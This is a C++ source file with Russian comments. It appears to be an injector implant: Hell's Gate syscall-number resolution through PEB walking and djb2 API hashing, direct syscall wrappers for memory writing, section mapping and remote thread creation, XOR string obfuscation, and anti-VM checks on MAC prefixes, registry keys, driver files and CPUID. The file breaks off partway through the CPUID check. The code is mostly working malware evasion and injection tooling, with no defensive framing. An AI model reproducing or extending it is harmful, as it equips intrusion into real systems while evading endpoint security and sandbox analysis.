#include "injector.h"
#include <stdio.h>  // Для printf / sprintf
#include <stdlib.h> // Для malloc / free
#include <string.h> // Для strlen / strcpy / strncmp / memcpy
#include <windows.h>
// #include <winternl.h> // УДАЛЕНО - используем кастомные структуры / HellsGate
#include <iphlpapi.h> // Для GetAdaptersInfo
#include <psapi.h>    // Для EnumProcesses (хотя пока не используем)
#include <intrin.h>   // Для __cpuid / __readgsqword / __readfsdword
#include <tlhelp32.h> // Для поиска процессов (хотя можно и без него, через GetShellWindow)
#include <userenv.h>  // Для CreateProcessWithTokenW
#include <vector>     // Для буфера логов (временное решение)
#include <string>     // Для буфера логов
#include <mutex>      // Для защиты буфера
#include <sstream>    // Для сборки JSON
#include <comdef.h> // Для _com_error, _bstr_t, _variant_t (если решим использовать)
#include <iostream>

#pragma comment(lib, "iphlpapi.lib") // Линковка с библиотекой для GetAdaptersInfo
#pragma comment(lib, "Userenv.lib") // Линковка с userenv.lib

// --- HellsGate Implementation ---

#define KERNEL32DLL_HASH   0x6A4ABC5B // Hash for kernel32.dll
#define NTDLLDLL_HASH      0x3CFA685D // Hash for ntdll.dll
#define LOADLIBRARYA_HASH  0xEC0E4E8E // Hash for LoadLibraryA
#define GETPROCADDRESS_HASH 0x7C0DFCAA // Hash for GetProcAddress
#define VIRTUALALLOC_HASH  0x91AFCA54 // Hash for VirtualAlloc
// Hashes for anchor syscalls (can use others, these are common)
#define NtAllocateVirtualMemory_HASH 0x6793C34C
#define NtProtectVirtualMemory_HASH  0x082962C8 // Corrected hash value
// Add hashes for other needed syscalls
#define NtWriteVirtualMemory_HASH    0x95F3A792
#define NtMapViewOfSection_HASH      0x231F196A
#define NtCreateThreadEx_HASH        0xCB0C2130
#define NtUnmapViewOfSection_HASH    0x595014AD
#define NtQueryInformationProcess_HASH 0x10F8132F // djb2("NtQueryInformationProcess")

// Simple hash function (djb2)
DWORD dwGetHash( char * cApiName )
{
    DWORD dwHash = 5381;
    while( *cApiName )
    {
        dwHash = ( ( dwHash << 5 ) + dwHash ) + (unsigned char)*cApiName;
        cApiName++;
    }
    return dwHash;
}

// Structure to hold export information
typedef struct _EXPORT_ENTRY {
    ULONG_PTR pAddress;
    DWORD dwHash;
} EXPORT_ENTRY, *PEXPORT_ENTRY;

// Helper structure for HellsGate context
typedef struct _HELLSGATE_CONTEXT {
    PEXPORT_ENTRY pExports;
    DWORD dwNumberOfExports;
    HMODULE hNtdll;
    BOOL bInitialized;
    DWORD dwFirstSyscallNumber; // Syscall number of the first validated function in the sorted list
    ULONG_PTR pFirstSyscallAddress; // Address of the first validated function
} HELLSGATE_CONTEXT, *PHELLSGATE_CONTEXT;

// Global context for HellsGate (or pass it around)
HELLSGATE_CONTEXT g_HellsGateContext = { 0 };

// Comparison function for qsort
int CompareExportEntries(const void* a, const void* b) {
    PEXPORT_ENTRY entryA = (PEXPORT_ENTRY)a;
    PEXPORT_ENTRY entryB = (PEXPORT_ENTRY)b;
    if (entryA->pAddress < entryB->pAddress) return -1;
    if (entryA->pAddress > entryB->pAddress) return 1;
    return 0;
}

// Minimal PEB/LDR structures (avoiding winternl.h)
// Minimal PEB structures (simplified versions, ensure architecture correctness)
typedef struct _UNICODE_STRING_MIN {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING_MIN, *PUNICODE_STRING_MIN;

#if defined(_WIN64)
#define OFFSET_PEB_LDR 0x18
#define OFFSET_LDR_DATA_InMemoryOrderModuleList 0x10 // Offset of InMemoryOrderModuleList within PEB_LDR_DATA
#define OFFSET_LDR_DATA_TABLE_ENTRY_InMemoryOrderLinks 0x00 // InMemoryOrderLinks is the first member
#define OFFSET_LDR_DATA_TABLE_ENTRY_DllBase 0x30
#define OFFSET_LDR_DATA_TABLE_ENTRY_BaseDllName 0x58
#else // _WIN32
#define OFFSET_PEB_LDR 0x0C
#define OFFSET_LDR_DATA_InMemoryOrderModuleList 0x0C // Offset of InMemoryOrderModuleList within PEB_LDR_DATA
#define OFFSET_LDR_DATA_TABLE_ENTRY_InMemoryOrderLinks 0x00
#define OFFSET_LDR_DATA_TABLE_ENTRY_DllBase 0x18
#define OFFSET_LDR_DATA_TABLE_ENTRY_BaseDllName 0x2C
#endif

// Macro to get field from PEB LDR Data Table Entry using offset
#define GET_LDR_ENTRY_FIELD(entryPtr, offset, type) (*(type*)((BYTE*)(entryPtr) + (offset)))

// Find the base address of a loaded module by hash (using PEB traversal and offsets)
HMODULE GetModuleBaseByHash(DWORD dwModuleHash)
{
    ULONG_PTR pPeb;
    ULONG_PTR pLdr;
    LIST_ENTRY* pListHead;
    LIST_ENTRY* pListEntry;

#if defined(_WIN64)
    pPeb = (ULONG_PTR)__readgsqword(0x60);
#else // _WIN32
    pPeb = (ULONG_PTR)__readfsdword(0x30);
#endif

    if (!pPeb) return NULL;

    pLdr = *(ULONG_PTR*)(pPeb + OFFSET_PEB_LDR);
    if (!pLdr) return NULL;

    pListHead = (LIST_ENTRY*)(pLdr + OFFSET_LDR_DATA_InMemoryOrderModuleList);
    pListEntry = pListHead->Flink;

    while (pListEntry != pListHead)
    {
        BYTE* pLdrEntry = (BYTE*)pListEntry; // Base address of LDR_DATA_TABLE_ENTRY
        UNICODE_STRING_MIN* pBaseDllName = (UNICODE_STRING_MIN*)((BYTE*)pLdrEntry + OFFSET_LDR_DATA_TABLE_ENTRY_BaseDllName);

        if (pBaseDllName && pBaseDllName->Buffer && pBaseDllName->Length > 0)
        {
            char szModuleName[MAX_PATH];
            int i = 0;
            while (i < (pBaseDllName->Length / sizeof(WCHAR)) && i < MAX_PATH - 1)
            {
                WCHAR wc = pBaseDllName->Buffer[i];
                if (wc >= 'A' && wc <= 'Z')
                    szModuleName[i] = (char)(wc + ('a' - 'A'));
                else
                    szModuleName[i] = (char)wc;
                i++;
            }
            szModuleName[i] = '\\0';

            if (dwGetHash(szModuleName) == dwModuleHash)
            {
                return (HMODULE)GET_LDR_ENTRY_FIELD(pLdrEntry, OFFSET_LDR_DATA_TABLE_ENTRY_DllBase, PVOID);
            }
        }
        // Get next entry using InMemoryOrderLinks offset
        pListEntry = GET_LDR_ENTRY_FIELD(pLdrEntry, OFFSET_LDR_DATA_TABLE_ENTRY_InMemoryOrderLinks, LIST_ENTRY*);
    }
    return NULL;
}

// Find the address of an exported function by hash (parsing PE Export Table)
FARPROC GetProcAddressByHash(HMODULE hModule, DWORD dwProcHash)
{
    if (!hModule) return NULL;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;

    // Check optional header magic
#ifdef _WIN64
    if (pNtHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return NULL;
#else
    if (pNtHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) return NULL;
#endif

    DWORD exportRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD exportSize = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!exportRVA || !exportSize) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)hModule + exportRVA);
    if (!pExportDir->AddressOfFunctions || !pExportDir->AddressOfNames || !pExportDir->AddressOfNameOrdinals) return NULL;

    PDWORD pdwFunctions = (PDWORD)((LPBYTE)hModule + pExportDir->AddressOfFunctions);
    PDWORD pdwNames = (PDWORD)((LPBYTE)hModule + pExportDir->AddressOfNames);
    PWORD pwOrdinals = (PWORD)((LPBYTE)hModule + pExportDir->AddressOfNameOrdinals);

    // Search by name hash
    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++)
    {
        char* szName = (char*)((LPBYTE)hModule + pdwNames[i]);
        if (dwGetHash(szName) == dwProcHash)
        {
            // Check for forwarded export? Optional.
            ULONG_PTR funcRVA = pdwFunctions[pwOrdinals[i]];
             // Check if the RVA points within the Export Directory itself (forwarded export)
            if (funcRVA >= exportRVA && funcRVA < (exportRVA + exportSize)) {
                // TODO: Handle forwarded exports if necessary (parse the forwarded string)
                printf("[GetProcAddressByHash] Warning: Forwarded export detected for hash 0x%X, not handled.\\n", dwProcHash);
                return NULL; 
            }
            return (FARPROC)((LPBYTE)hModule + funcRVA);
        }
    }

    return NULL; // Function not found by name hash
}

// Function to parse NTDLL EAT and initialize HellsGate context
BOOL InitializeHellsGate()
{
    if (g_HellsGateContext.bInitialized) return TRUE;
    printf("[HellsGate] Initializing...\\n");

    g_HellsGateContext.hNtdll = GetModuleBaseByHash(NTDLLDLL_HASH);
    if (!g_HellsGateContext.hNtdll) {
         printf("[HellsGate] Failed to get ntdll.dll base address.\\n");
         return FALSE;
    }
    printf("[HellsGate] ntdll.dll base: %p\\n", g_HellsGateContext.hNtdll);

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)g_HellsGateContext.hNtdll;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)g_HellsGateContext.hNtdll + pDosHeader->e_lfanew);
    DWORD exportRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
     if (!exportRVA) {
        printf("[HellsGate] Failed to get Export Directory RVA.\\n");
        return FALSE;
     }
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)g_HellsGateContext.hNtdll + exportRVA);

    if (!pExportDir || !pExportDir->NumberOfNames || !pExportDir->AddressOfNames || !pExportDir->AddressOfFunctions || !pExportDir->AddressOfNameOrdinals) {
         printf("[HellsGate] Invalid Export Directory structure.\\n");
        return FALSE;
    }
     printf("[HellsGate] Found %lu exported names.\\n", pExportDir->NumberOfNames);

    PDWORD pdwFunctions = (PDWORD)((LPBYTE)g_HellsGateContext.hNtdll + pExportDir->AddressOfFunctions);
    PDWORD pdwNames = (PDWORD)((LPBYTE)g_HellsGateContext.hNtdll + pExportDir->AddressOfNames);
    PWORD pwOrdinals = (PWORD)((LPBYTE)g_HellsGateContext.hNtdll + pExportDir->AddressOfNameOrdinals);

    g_HellsGateContext.dwNumberOfExports = pExportDir->NumberOfNames; // Initial estimate
    // Allocate memory for exports (using VirtualAlloc for potential stealth)
    g_HellsGateContext.pExports = (PEXPORT_ENTRY)VirtualAlloc(NULL, g_HellsGateContext.dwNumberOfExports * sizeof(EXPORT_ENTRY), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!g_HellsGateContext.pExports) {
         printf("[HellsGate] Failed to allocate memory for exports.\\n");
        return FALSE;
    }

    DWORD dwValidExports = 0;
    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        char* szName = (char*)((LPBYTE)g_HellsGateContext.hNtdll + pdwNames[i]);
        if (szName) {
            ULONG_PTR pFuncAddress = (ULONG_PTR)((LPBYTE)g_HellsGateContext.hNtdll + pdwFunctions[pwOrdinals[i]]);
            // Basic check: only consider functions starting with 'Nt' (Zw are aliases)
            if (strncmp(szName, "Nt", 2) == 0) {
                 g_HellsGateContext.pExports[dwValidExports].pAddress = pFuncAddress;
                 g_HellsGateContext.pExports[dwValidExports].dwHash = dwGetHash(szName); // Use existing hash function
                 dwValidExports++;
            }
        }
    }
     g_HellsGateContext.dwNumberOfExports = dwValidExports; // Update count to actual Nt* exports found
     printf("[HellsGate] Found %lu Nt* functions.\\n", dwValidExports);

    // Sort exports by address
    qsort(g_HellsGateContext.pExports, g_HellsGateContext.dwNumberOfExports, sizeof(EXPORT_ENTRY), CompareExportEntries);

    // --- Find the Gate ---
    printf("[HellsGate] Searching for the gate (sequential syscall numbers)...\\n");
    DWORD dwSyscallNum1 = 0xFFFFFFFF, dwSyscallNum2 = 0xFFFFFFFF;

    for (DWORD i = 0; i < g_HellsGateContext.dwNumberOfExports - 1; i++) { // Iterate up to second-to-last
         BYTE* pFuncBytes1 = (BYTE*)g_HellsGateContext.pExports[i].pAddress;
         BYTE* pFuncBytes2 = (BYTE*)g_HellsGateContext.pExports[i+1].pAddress;

         // Basic check for x64 syscall stub pattern
         // mov r10, rcx       ; 4C 8B D1
         // mov eax, syscall_num ; B8 xx xx xx xx
         // syscall            ; 0F 05
         // ret                ; C3
         // nop                ; 90 (optional padding)
         if (pFuncBytes1[0] == 0x4C && pFuncBytes1[1] == 0x8B && pFuncBytes1[2] == 0xD1 &&
             pFuncBytes1[3] == 0xB8 &&
             pFuncBytes1[8] == 0x0F && pFuncBytes1[9] == 0x05 &&
             pFuncBytes1[10] == 0xC3 &&
             pFuncBytes2[0] == 0x4C && pFuncBytes2[1] == 0x8B && pFuncBytes2[2] == 0xD1 &&
             pFuncBytes2[3] == 0xB8 &&
             pFuncBytes2[8] == 0x0F && pFuncBytes2[9] == 0x05 &&
             pFuncBytes2[10] == 0xC3)
         {
               dwSyscallNum1 = *(DWORD*)(pFuncBytes1 + 4); // Get syscall number from mov eax, imm32
               dwSyscallNum2 = *(DWORD*)(pFuncBytes2 + 4);

               // Check if they are sequential
               if (dwSyscallNum2 == dwSyscallNum1 + 1) {
                     g_HellsGateContext.pFirstSyscallAddress = g_HellsGateContext.pExports[i].pAddress;
                     g_HellsGateContext.dwFirstSyscallNumber = dwSyscallNum1;
                     g_HellsGateContext.bInitialized = TRUE;
                     printf("[HellsGate] Gate found! First syscall Addr: %p, Num: 0x%X (%lu)\\n",
                           (void*)g_HellsGateContext.pFirstSyscallAddress,
                           g_HellsGateContext.dwFirstSyscallNumber, g_HellsGateContext.dwFirstSyscallNumber);
                     // Optionally free memory used for export names if not needed anymore
                     // VirtualFree(...)
                     return TRUE; // Gate found!
               }
         }
    }

    // Gate not found - cleanup and return error
    printf("[HellsGate] Gate not found! Failed to validate syscall sequence.\\n");
    VirtualFree(g_HellsGateContext.pExports, 0, MEM_RELEASE);
    g_HellsGateContext.pExports = NULL;
    g_HellsGateContext.dwNumberOfExports = 0;
    return FALSE;
}

// Function to get syscall number using HellsGate
DWORD GetSyscallNumberByHashHellsGate(DWORD dwFunctionHash)
{
    if (!g_HellsGateContext.bInitialized) {
        if (!InitializeHellsGate()) {
            return 0xFFFFFFFF; // Indicate error
        }
    }

    // Find the target function index and the first syscall index in the sorted list
    DWORD firstSyscallIndex = 0xFFFFFFFF;
    DWORD targetIndex = 0xFFFFFFFF;

    for (DWORD i = 0; i < g_HellsGateContext.dwNumberOfExports; i++) {
        if (g_HellsGateContext.pExports[i].pAddress == g_HellsGateContext.pFirstSyscallAddress) {
            firstSyscallIndex = i;
        }
        if (g_HellsGateContext.pExports[i].dwHash == dwFunctionHash) {
            targetIndex = i;
        }
        if (firstSyscallIndex != 0xFFFFFFFF && targetIndex != 0xFFFFFFFF) {
            break; // Found both
        }
    }

    if (firstSyscallIndex != 0xFFFFFFFF && targetIndex != 0xFFFFFFFF) {
        // Calculate the target syscall number based on the index difference
        DWORD syscallNumber = g_HellsGateContext.dwFirstSyscallNumber + (targetIndex - firstSyscallIndex);
         printf("[HellsGate] Found Syscall Number for hash 0x%X: 0x%X (%lu)\\n", dwFunctionHash, syscallNumber, syscallNumber);
        return syscallNumber;
    } else {
         printf("[HellsGate] Failed to find index for target hash 0x%X or first syscall address.\\n", dwFunctionHash);
        return 0xFFFFFFFF; // Target or first syscall index not found
    }
}

// --- End HellsGate Implementation ---


// --- Direct Syscall Wrappers ---

// DirectSyscall_NtWriteVirtualMemory
__declspec(naked) NTSTATUS DirectSyscall_NtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten)
{
    DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtWriteVirtualMemory_HASH);
    if (syscallNumber == 0xFFFFFFFF) { __asm { ret } } // Basic error handling
    __asm {
        mov eax, syscallNumber
        mov r10, rcx
        syscall
        ret
    }
}

// DirectSyscall_NtMapViewOfSection
__declspec(naked) NTSTATUS DirectSyscall_NtMapViewOfSection(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset, // Optional pointer
    PSIZE_T ViewSize,             // In/Out pointer
    DWORD InheritDisposition,     // SECTION_INHERIT enum replacement
    ULONG AllocationType,
    ULONG Win32Protect)
{
    DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtMapViewOfSection_HASH);
    if (syscallNumber == 0xFFFFFFFF) { __asm { ret } }
    __asm {
        mov eax, syscallNumber
        mov r10, rcx
        syscall
        ret
    }
}

// DirectSyscall_NtCreateThreadEx
__declspec(naked) NTSTATUS DirectSyscall_NtCreateThreadEx(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes, // Optional POBJECT_ATTRIBUTES pointer
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine, // PUSER_THREAD_START_ROUTINE function pointer
    IN PVOID Argument,     // Optional argument pointer
    IN ULONG CreateFlags, // THREAD_CREATE_FLAGS, e.g., 0x00000004 for suspended
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList // Optional PPS_ATTRIBUTE_LIST pointer
    )
{
    DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtCreateThreadEx_HASH);
    if (syscallNumber == 0xFFFFFFFF) { __asm { ret } }
    __asm {
        mov eax, syscallNumber
        mov r10, rcx
        syscall
        ret
    }
}

// DirectSyscall_NtUnmapViewOfSection
__declspec(naked) NTSTATUS DirectSyscall_NtUnmapViewOfSection(
    HANDLE ProcessHandle,
    PVOID BaseAddress // Can be NULL
)
{
    DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtUnmapViewOfSection_HASH);
    if (syscallNumber == 0xFFFFFFFF) { __asm { ret } }
    __asm {
        mov eax, syscallNumber
        mov r10, rcx
        syscall
        ret
    }
}

// DirectSyscall_NtQueryInformationProcess
__declspec(naked) NTSTATUS DirectSyscall_NtQueryInformationProcess(
    HANDLE ProcessHandle,
    DWORD ProcessInformationClass, // PROCESSINFOCLASS enum replacement (e.g., 0 for ProcessBasicInformation)
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength // Optional pointer
)
{
    DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtQueryInformationProcess_HASH);
     if (syscallNumber == 0xFFFFFFFF) { __asm { ret } }
    __asm {
        mov eax, syscallNumber
        mov r10, rcx
        syscall
        ret
    }
}

// --- End Direct Syscall Wrappers ---


// --- Макрос и функция для XOR-обфускации строк ---
#define XOR_KEY 0xAE // Простой ключ, можно сделать сложнее

// Функция для "деобфускации" строки на лету
char* deobfuscate(const char* obfuscated_str, size_t len) {
    char* deobfuscated = (char*)malloc(len + 1);
    if (!deobfuscated) return NULL; 
    for(size_t i = 0; i < len; ++i) {
        deobfuscated[i] = obfuscated_str[i] ^ XOR_KEY;
    }
    deobfuscated[len] = '\0';
    return deobfuscated;
}

// Вспомогательная структура для хранения обфусцированной строки и ее длины
struct ObfuscatedString {
    const char* data;
    size_t length;
};

// Макрос для создания обфусцированной строки во время компиляции
// Использование: OBFUSCATED("My Secret String")
#define OBFUSCATED(str)                                     \
    ([]() -> ObfuscatedString {                             \
        constexpr size_t len = sizeof(str) - 1;             \
        char obfuscated[len + 1];                           \
        for(size_t i = 0; i < len; ++i) {                   \
            obfuscated[i] = str[i] ^ XOR_KEY;             \
        }                                                   \
        obfuscated[len] = 0; /* Null terminator не XORим */ \
        /* Статическая переменная для хранения данных */      \
        /* Это не идеально, но просто для примера */       \
        /* В реальном коде лучше размещать в .data секции */ \
        static char storage[len + 1];                       \
        memcpy(storage, obfuscated, len + 1);             \
        return { storage, len };                            \
    }()) 

// Прототип для NtUnmapViewOfSection (позже будем получать динамически)
/*
typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);
*/

// --- Вспомогательная функция для получения текста ошибки Windows ---
char* get_windows_error_message(DWORD errorCode) {
    LPSTR messageBuffer = NULL;
    // ОБФУСЦИРОВАННАЯ СТРОКА
    ObfuscatedString fmtAlloc = OBFUSCATED("Error code %lu: %s");
    ObfuscatedString fmtCode = OBFUSCATED("Windows API Error Code: %lu");

    size_t size = FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, errorCode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

    char* finalMsg = NULL;
    if (size > 0) {
        char* fmtAlloc_deob = deobfuscate(fmtAlloc.data, fmtAlloc.length);
        if (!fmtAlloc_deob) { /* Обработка ошибки malloc */ return NULL; }
        size_t requiredSize = snprintf(NULL, 0, fmtAlloc_deob, errorCode, messageBuffer) + 1; 
        finalMsg = (char*)malloc(requiredSize);
        if (finalMsg) {
            snprintf(finalMsg, requiredSize, fmtAlloc_deob, errorCode, messageBuffer);
        }
        free(fmtAlloc_deob);
        LocalFree(messageBuffer); 
    } else {
        char* fmtCode_deob = deobfuscate(fmtCode.data, fmtCode.length);
         if (!fmtCode_deob) { /* Обработка ошибки malloc */ return NULL; }
        size_t requiredSize = snprintf(NULL, 0, fmtCode_deob, errorCode) + 1;
        finalMsg = (char*)malloc(requiredSize);
        if(finalMsg) {
            snprintf(finalMsg, requiredSize, fmtCode_deob, errorCode);
        }
        free(fmtCode_deob);
    }
    return finalMsg; 
}

// --- Функция для проверки базовых признаков виртуального окружения ---
BOOL IsVMEnvironmentDetected() {
    BOOL isVM = FALSE;

    // 1. Проверка MAC-адреса известных вендоров VM
    PIP_ADAPTER_INFO pAdapterInfo = NULL;
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
    if (pAdapterInfo == NULL) {
        printf("[Anti-VM] Failed to allocate memory for GetAdaptersInfo\n");
        // Не критично, продолжаем другие проверки
    } else {
        // Вызываем GetAdaptersInfo с начальным буфером
        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
            free(pAdapterInfo);
            pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
            if (pAdapterInfo == NULL) {
                 printf("[Anti-VM] Failed to allocate memory for GetAdaptersInfo (retry)\n");
                 // Не критично
            }
        }

        if (pAdapterInfo && GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
            PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
            while (pAdapter) {
                // VMware MAC prefixes
                if ((pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x05 && pAdapter->Address[2] == 0x69) ||
                    (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x0C && pAdapter->Address[2] == 0x29) ||
                    (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x1C && pAdapter->Address[2] == 0x14) ||
                    (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x50 && pAdapter->Address[2] == 0x56)) {
                    printf("[Anti-VM] VMware MAC address detected.\n");
                    isVM = TRUE;
                    break;
                }
                // VirtualBox MAC prefix
                if (pAdapter->Address[0] == 0x08 && pAdapter->Address[1] == 0x00 && pAdapter->Address[2] == 0x27) {
                     printf("[Anti-VM] VirtualBox MAC address detected.\n");
                     isVM = TRUE;
                     break;
                }
                 // Microsoft Hyper-V / Virtual PC
                if ((pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x03 && pAdapter->Address[2] == 0xFF) || // Hyper-V
                    (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x15 && pAdapter->Address[2] == 0x5D) || // Hyper-V new
                    (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x22 && pAdapter->Address[2] == 0x48)) { // Virtual PC
                    printf("[Anti-VM] Microsoft Virtualization MAC address detected.\n");
                    isVM = TRUE;
                    break;
                }
                pAdapter = pAdapter->Next;
            }
        }
        if (pAdapterInfo) {
            free(pAdapterInfo);
        }
        if (isVM) return TRUE; // Если нашли по MAC, выходим
    }


    // 2. Проверка реестра на ключи/значения, связанные с VM
    HKEY hKey;
    LONG regResult;
    CHAR value[256];
    DWORD bufferSize = sizeof(value);
    const char* regPaths[] = {
        "HARDWARE\Description\System\BIOS", // Check SystemBiosVersion, BaseBoardProduct, etc.
        "HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0", // Check Identifier
        "SYSTEM\CurrentControlSet\Services\Disk\Enum" // Check device names
    };
    const char* vmStrings[] = {"VMWARE", "VBOX", "VIRTUALBOX", "QEMU", "HYPER-V", "XEN", "VIRTUAL"};

    for (int i=0; i < sizeof(regPaths)/sizeof(regPaths[0]); ++i) {
         regResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE, regPaths[i], 0, KEY_READ, &hKey);
         if (regResult == ERROR_SUCCESS) {
            // Проверяем значения в открытом ключе
            DWORD index = 0;
            CHAR valueName[256];
            DWORD valueNameSize = sizeof(valueName);
            DWORD valueType;
            DWORD dataSize = sizeof(value);

            while (RegEnumValueA(hKey, index++, valueName, &valueNameSize, NULL, &valueType, (LPBYTE)value, &dataSize) == ERROR_SUCCESS) {
                if (valueType == REG_SZ) { // Ищем только строковые значения
                    CharUpperA(value); // Приводим к верхнему регистру для сравнения без учета регистра
                    for (int j=0; j < sizeof(vmStrings)/sizeof(vmStrings[0]); ++j) {
                        if (strstr(value, vmStrings[j]) != NULL) {
                             printf("[Anti-VM] VM signature '%s' found in Registry (%s -> %s).\n", vmStrings[j], regPaths[i], valueName);
                             isVM = TRUE;
                             RegCloseKey(hKey);
                             return TRUE;
                        }
                    }
                }
                // Сбрасываем размеры для следующей итерации
                valueNameSize = sizeof(valueName);
                dataSize = sizeof(value);
            }
            RegCloseKey(hKey);
         } // else: ключ не найден, это нормально, пробуем следующий
    }
    if (isVM) return TRUE;


    // 3. Проверка наличия известных файлов/драйверов VM
    const char* vmFiles[] = {
        "C:\Windows\System32\drivers\VBoxGuest.sys",
        "C:\Windows\System32\drivers\VBoxMouse.sys",
        "C:\Windows\System32\drivers\VBoxSF.sys",
        "C:\Windows\System32\drivers\VBoxVideo.sys",
        "C:\Windows\System32\vboxdisp.dll",
        "C:\Windows\System32\vboxhook.dll",
        "C:\Windows\System32\vboxogl.dll",
        "C:\Windows\System32\vboxoglarrayspu.dll",
        "C:\Windows\System32\vboxoglcrutil.dll",
        "C:\Windows\System32\vboxoglerrorspu.dll",
        "C:\Windows\System32\vboxoglfeedbackspu.dll",
        "C:\Windows\System32\vboxoglpackspu.dll",
        "C:\Windows\System32\vboxoglpassthroughspu.dll",
        "C:\Windows\System32\vboxservice.exe",
        "C:\Windows\System32\vboxtray.exe",
        "C:\Windows\System32\drivers\vmhgfs.sys",
        "C:\Windows\System32\drivers\vmci.sys",      // VMware VMCI Bus Driver
        "C:\Windows\System32\drivers\vsock.sys",     // VMware vSockets Driver
        "C:\Windows\System32\drivers\vmmouse.sys",
        "C:\Windows\System32\drivers\vmx_svga.sys",
        "C:\Windows\System32\drivers\vmxnet.sys",
        "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe",
        "C:\Program Files\Oracle\VirtualBox Guest Additions\\",
        "C:\Windows\System32\drivers\hyperkbd.sys", // Hyper-V Keyboard
        "C:\Windows\System32\drivers\vmbus.sys",    // Hyper-V Virtual Machine Bus
        "C:\Windows\System32\drivers\Vhdmp.sys",    // Hyper-V VHD Driver
        "C:\Windows\System32\drivers\vpcbus.sys",   // Virtual PC Bus Driver
        "C:\Windows\System32\drivers\vpc-s3.sys",   // Virtual PC S3 Video Driver
        "C:\Windows\System32\drivers\xen.sys",      // Xen Driver
    };

    for (int i = 0; i < sizeof(vmFiles) / sizeof(vmFiles[0]); ++i) {
        DWORD fileAttr = GetFileAttributesA(vmFiles[i]);
        if (fileAttr != INVALID_FILE_ATTRIBUTES) {
            // Проверяем, не является ли это директорией (для случаев типа Program Files)
             if (!(fileAttr & FILE_ATTRIBUTE_DIRECTORY) || (strstr(vmFiles[i], ".sys") || strstr(vmFiles[i], ".dll") || strstr(vmFiles[i], ".exe")) ) {
                 printf("[Anti-VM] VM-related file/driver detected: %s\n", vmFiles[i]);
                 isVM = TRUE;
                 return TRUE;
             }
              // Если это директория, проверяем существование
             if (fileAttr & FILE_ATTRIBUTE_DIRECTORY && strstr(vmFiles[i], "Additions") ) { // Пример для папки Guest Additions
                  printf("[Anti-VM] VM-related directory detected: %s\n", vmFiles[i]);
                  isVM = TRUE;
                  return TRUE;
             }
        }
    }

    // 4. Проверка CPUID (простейший вариант)
    // Лист 0x40000000 используется многими гипервизорами для идентификации
    int cpuInfo[4];
    __cpuid(cpuInfo, 0x40000000);
    char hypervisorName[13];
    memcpy(hypervisorName + 0, &cpuInfo[1], 4); // EBX
    memcpy(hypervisorName + 4, &cpuInfo[2], 4); // ECX
    memcpy(hypervisorName + 8, &cpuInfo[3], 4); // EDX
    hypervisorName[12] = '\0';

    if (strcmp(hypervisorName, "VMwareVMware") == 0 ||
        strcmp(hypervisorName, "KVMKVMKVM") == 0 ||
